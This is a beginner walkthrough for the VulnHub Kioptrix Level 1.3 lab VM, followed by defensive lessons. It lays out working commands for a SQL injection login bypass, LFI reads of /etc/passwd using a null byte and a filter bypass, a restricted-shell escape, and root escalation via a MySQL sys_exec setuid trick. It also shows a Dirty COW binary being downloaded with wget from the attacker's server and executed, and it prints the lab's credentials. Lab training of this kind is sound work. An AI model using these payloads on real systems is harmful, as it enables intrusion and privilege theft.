# Kioptrix: Level 1.3 (#4) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.3 (#4) |
| **Difficulty** | Easy / Intermediate |
| **Author** | loneferret (Kioptrix) |
| **Released** | February 8, 2012 |
| **VulnHub Entry** | [Kioptrix: Level 1.3 (#4) on VulnHub](https://vulnhub.com/entry/kioptrix-level-13-4,25/) |
| **Download** | [Kioptrix: Level 1.3 (#4) OVA](https://vulnhub.com/entry/kioptrix-level-13-4,25/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, kernel 2.6.24; "LigGoat" PHP login app) |

> **Be patient on boot:** the author warns this image can take a moment to get a DHCP address, and it has occasionally needed a restart. The target IP may differ from the example `192.168.56.101` — always confirm with a scan.

## 0. What you will learn

- **Web enumeration:** Finding hidden directories and a leaked database file.
- **Authentication bypass via SQL injection:** Logging in as an existing user with `' OR 1=1 #`.
- **Local File Inclusion (LFI) with filters:** Reading files through `member.php?username=`, and defeating a naive keyword filter with a null byte and doubling.
- **SMB enumeration:** Extracting usernames with `enum4linux`.
- **Escaping a restricted shell (`lshell`):** `echo os.system("/bin/bash")`.
- **Privilege escalation via a root MySQL + UDF:** Using `sys_exec` to set setuid on `/bin/bash`.
- **Alternative escalation:** The kernel 2.6.24 "Dirty COW" exploit and `/etc/passwd` manipulation.
- **Defensive thinking:** Blue-team lessons about SQLi, LFI, root services, and restricted shells.

## 1. Reconnaissance — finding the target

```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each responding host is a live machine. Your Kali is one; the Kioptrix VM is the other. Note its IP (example `192.168.56.101`).

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** A quick reachability sweep. Confirm the target is up before scanning ports.

![host discovery](images/01-recon-netdiscover.png)

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,139,445 -oA scans/services 192.168.56.101
```

> **How to read it:** First find all open TCP ports, then fingerprint the interesting ones. `-sC` runs default NSE scripts; `-sV` grabs service versions.

### 2.2 Realistic expected output

Exact banners vary by build, but a common result:

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4)
139/tcp open  netbios-ssn Samba smbd 3.0.28a
445/tcp open  netbios-ssn Samba smbd 3.0.28a
```

> **How to read it:** A PHP web app on port 80 and SMB on 139/445. SMB will give us usernames; the web app is the entry point.

### 2.3 Web directory discovery

```bash
feroxbuster -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,sql,txt
```

> **How to read it:** `-x php,sql,txt` also tries those extensions. Watch for:
> - `/john/` and `/robert/` (directories named after likely usernames),
> - `/database.sql` (a leaked SQL dump!),
> - `/member.php`, `/checklogin.php`, `/logout`.

**Fetch the leaked SQL dump:**

```bash
curl http://192.168.56.101/database.sql
```

> **How to read it:** A dump file often contains schema plus sample data — including credentials. This one reveals the `members` table (usernames and passwords), giving you candidate usernames to try against the login.

![nmap and directory scan](images/02-nmap.png)

## 3. Foothold

### 3.1 SQL injection — authentication bypass

The login page (`index.php`) posts to `checklogin.php`. Test with a single quote to confirm it is injectable:

```text
Username: john
Password: '
```

> **How to read it:** A raw MySQL error (instead of a clean "invalid login") means the input reaches the database unescaped — the app is **SQL-injectable**. It even leaks the path `/var/www/checklogin.php`.

Now log in as a real user. Common users found from the SQL dump and SMB are `john` and `robert`. Try:

```text
Username: john
Password: ' OR 1=1 #
```

> **How to read it:** `' OR 1=1` makes the WHERE clause always true; `#` starts a MySQL comment, discarding the rest of the query (including the password check). The app logs us in — and often **displays the account's own password** on the member page. Community writeups report `john : MyNameIsJohn` and `robert : ADGAdsafdfwt4gadfga==` (the latter is **not** actually Base64 — it is the literal password).

### 3.2 LFI — reading files through `member.php`

The member page builds a filename from the `username` parameter, roughly `include(".../<username>/<username>.php")`. That is a **Local File Inclusion** risk.

First, observe the behavior:

```text
http://192.168.56.101/member.php?username=./..
```

> **How to read it:** The error message shows how your input is wrapped (a directory plus `.php` appended). To include an arbitrary file we must (a) climb directories with `../` and (b) stop the app appending `.php` — using a **null byte** `%00`.

Try:

```text
http://192.168.56.101/member.php?username=/proc/version%00
```

> **How to read it:** If the kernel version prints, the include is controllable. But requesting `/etc/passwd` is often blocked because the app strips the word `etc`.

**Defeat the naive `etc` filter:** the filter appears to remove `etc` exactly **once**. Doubling the letters merges them back after removal (`e` + `etc` + `c` → `etc`):

```text
http://192.168.56.101/member.php?username=/eetctc/passwd%00
```

> **How to read it:** The filter deletes the inner `etc`, leaving `/etc/passwd` intact. You should now see the user list, confirming `john`, `robert`, `loneferret`, and `root`. (g0tmi1k's original writeup describes this exact one-pass filter trick.)
> **Why it works:** This is a filter that replaces `etc` with empty **one time**; redundant wrapping of the characters defeats it. Filters like this are a textbook example of why blocklists fail.

### 3.3 SMB enumeration — more usernames

```bash
enum4linux -a 192.168.56.101
```

> **How to read it:** `enum4linux` gathers SMB users, shares and policy. Look at the users list (`john`, `robert`, `loneferret`, `root`) and confirm the login candidates. The SMB `print$`/`IPC$` shares add little here, but the usernames are valuable.

### 3.4 SSH in (and a restricted shell)

With credentials in hand, SSH in:

```bash
ssh john@192.168.56.101
# password: MyNameIsJohn
```

> **How to read it:** You are dropped into a **restricted shell** (`lshell`). The banner says type `?` or `help` for allowed commands. Try running something not on the list — you get a "forbidden" warning, and repeated violations disconnect you.

```text
? 
cd  clear  echo  exit  help  ll  lpath  ls
```

> **How to read it:** Only a handful of commands are permitted. Crucially, **`echo`** is allowed — and `lshell` is written in Python, so an `echo` line can be evaluated as Python.

**Escape the restricted shell:**

```bash
echo os.system("/bin/bash")
```

> **How to read it:** `lshell` evaluates the argument to `echo` and runs `os.system("/bin/bash")`, spawning a real Bash shell **outside** the restrictions. You now have a normal user shell as `john` (or `robert`).
> **Why it works:** The restricted shell only *wraps* the real shell; any interpreter feature that can start another process escapes the wrapper.

![foothold: login bypass, LFI, lshell escape](images/03-foothold.png)

## 4. Privilege escalation

### 4.1 Find MySQL credentials (the web app uses root with a blank password)

Read the login handler in the web root:

```bash
cat /var/www/checklogin.php
```

Example (abbreviated):

```php
$host="localhost";   // Host name
$username="root";    // Mysql username
$password="";        // Mysql password
$db_name="members";
```

> **How to read it:** The web app connects to MySQL as **`root` with an empty password**. That is the misconfiguration we will weaponize. (Naming/paths vary slightly by build.)

Confirm the MySQL process runs as root:

```bash
ps aux | grep mysql
```

> **How to read it:** If the `mysqld` process is owned by `root`, then any command it executes also runs as `root` — which is exactly what we want.

### 4.2 Log in to MySQL

```bash
mysql -u root -p
# press Enter at the password prompt (blank password)
```

Then:

```sql
SHOW DATABASES;
USE members;
SELECT * FROM members;
```

Example output:

```text
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          |
|  2 | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```

> **How to read it:** The same credentials we found via SQLi. Confirm the UDF library exists:

```bash
whereis lib_mysqludf_sys.so
```

> **How to read it:** This VM ships `lib_mysqludf_sys.so` already present. That library provides the `sys_exec()` function, which runs **system commands from inside MySQL**.

### 4.3 Root via MySQL `sys_exec` (setuid bash)

Because MySQL runs as root, `sys_exec()` runs commands as root. Create the function (if not already loaded) and use it to make `/bin/bash` setuid-root:

```sql
use mysql;
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('chmod u+s /bin/bash');
```

> **How to read it:** `chmod u+s /bin/bash` sets the **setuid** bit on Bash, meaning it will run with the file owner's privileges (root) no matter who launches it.

Then drop out of MySQL and grab root:

```bash
ls -l /bin/bash
bash -p
whoami
```

Expected:

```text
-rwsr-xr-x 1 root root ... /bin/bash
root
```

> **How to read it:** The `s` in `-rwsr-xr-x` shows setuid is set. `bash -p` runs Bash **preserving** the effective UID (root) instead of dropping it — instant root.
> **Alternative via `sys_exec`:** `SELECT sys_exec('usermod -a -G admin john');` adds `john` to the `admin` group (which can sudo on old Ubuntu), after which `sudo su` gives root.

### 4.4 Alternative — kernel "Dirty COW" (2.6.24)

The kernel is **2.6.24**, vulnerable to **Dirty COW (CVE-2016-5195)**. The popular exploit (EDB **40839**) overwrites `/etc/passwd` to add a new UID-0 user.

**Compile on Kali** (target has no compiler), then transfer:

```bash
searchsploit -p 40839
gcc -pthread 40839.c -o dirty -lcrypt
python3 -m http.server 8000
```

**On the target:**

```bash
cd /tmp
wget http://192.168.56.10:8000/dirty
chmod +x dirty
./dirty
```

> **How to read it:** The exploit backs up `/etc/passwd`, prompts for a password, then creates a new root-level user (historically `firefart`). Log in with it:
>
> ```bash
> su firefart
> ```
>
> **Important:** after gaining root, restore the original file so the `root` account keeps working: `mv /tmp/passwd.bak /etc/passwd`.

> **Note on egress filtering:** the author installed `iptables` rules blocking several ports (including 80 and 4444). If `wget` from a Python server on port 8000 times out, host the file on an allowed port — community writeups used **port 81**. Check `/etc/iptables.rules` for the blocked ranges.

**Read the proof:**

```bash
cat /root/congrats.txt
```

> **How to read it:** The root directory has a congratulatory file rather than a flag; a root shell is the win.

![root via mysql sys_exec / dirty cow](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| SQL injection (authentication bypass) | N/A (design flaw) | `checklogin.php` login | 80 (HTTP) | Bypass login; leak stored passwords | Unsanitized input in SQL query. |
| Local File Inclusion (+ filter bypass) | N/A (design flaw) | `member.php?username=` | 80 (HTTP) | Arbitrary file read (`/etc/passwd`) | Null byte + doubled `etc` defeats filter. |
| Information disclosure | N/A (misconfiguration) | `/database.sql` | 80 (HTTP) | Leaked schema/credentials | Backup dump left in web root. |
| MySQL running as root with blank password | N/A (misconfiguration) | `checklogin.php` / `mysqld` | local | Root via `sys_exec` UDF | Cleartext creds; DB service over-privileged. |
| Restricted shell not truly isolating | N/A (design flaw) | `lshell` (`echo`) | 22 (SSH) | Escape to full shell | Python `os.system` reachable via `echo`. |
| Linux kernel privilege escalation (Dirty COW) | CVE-2016-5195 | Linux Kernel 2.6.24 | local | Low user → root | EDB 40839; overwrites `/etc/passwd`. |

> **How to read it:** The intended chain is SQLi → LFI → user → MySQL **root** blank password → `sys_exec` UDF → root. Dirty COW is a second, independent root path.

## 6. Defensive lessons (blue team)

- **Prevent SQL injection with parameterized queries.** This closes the login bypass and any related data leaks in one change.
- **Never include files from user-controlled input.** Resolve paths server-side against an allow-list; reject `..`, null bytes, and absolute paths. Null-byte tricks exist precisely because developers concatenate untrusted strings into file paths.
- **Do not rely on blacklist string filters.** The one-pass `etc` filter here was defeated by doubling letters. Blocklists fail; allow-lists and proper APIs do not.
- **Never keep database backups in the web root.** `database.sql` handed attackers the schema and sample credentials. Store dumps outside the document root with strict permissions.
- **Do not run the database as `root`, and never leave the root account passwordless.** Run MySQL as a dedicated low-privilege user and give the app a least-privilege DB account. This alone defeats the `sys_exec` escalation.
- **Remove dangerous DB features.** The `lib_mysqludf_sys` UDF grants command execution. Do not ship it, and restrict `FILE`/UDF usage for non-admin accounts.
- **Restricted shells must not expose an interpreter.** A restricted shell that still lets a user reach `os.system` provides no isolation. Use proper sandboxes/containers or RBAC instead.
- **Patch the kernel.** Dirty COW's blast radius is severe; keep kernels current. If your egress firewall allows outbound connections, an attacker can still pull exploits, so combine patching with outbound filtering.

## 7. References

Real community writeups consulted during research (they document these paths):

- [VulnHub – Kioptrix: Level 4 (1.3) — davidvarghese](https://blog.davidvarghese.com/posts/vulnhub-kioptrix-level-4/)
- [Kioptrix Level 4 CTF Walkthrough — rastating](https://rastating.github.io/kioptrix-level-4-ctf-walkthrough/)
- [Kioptrix Level 1.3 (VM #4) Walkthrough — Will Chatham](https://blog.willchatham.com/2017/03/14/kioptrix-level-1-3-vm-4-walkthrough/)
- [Kiopritx 1.3 (#4) Walkthrough — abatchy](https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub)
- [Kioptrix Level 4 (Local File Inclusion) — g0tmi1k](https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/)
- [VulnHub Entry — Kioptrix: Level 1.3 (#4)](https://vulnhub.com/entry/kioptrix-level-13-4,25/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap + directory scan (`/john`, `/robert`, `database.sql`)
- [ ] `images/03-foothold.png` — SQLi login bypass, LFI read of `/etc/passwd`, and `lshell` escape
- [ ] `images/04-root-escalation.png` — MySQL `sys_exec('chmod u+s /bin/bash')` and `bash -p` → root
- [ ] `images/05-proof.png` — `/root/congrats.txt` or root `whoami`

> **How to read it:** Store screenshots in `labs/kioptrix-level-13-4/images/` and reference them with the relative paths shown.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
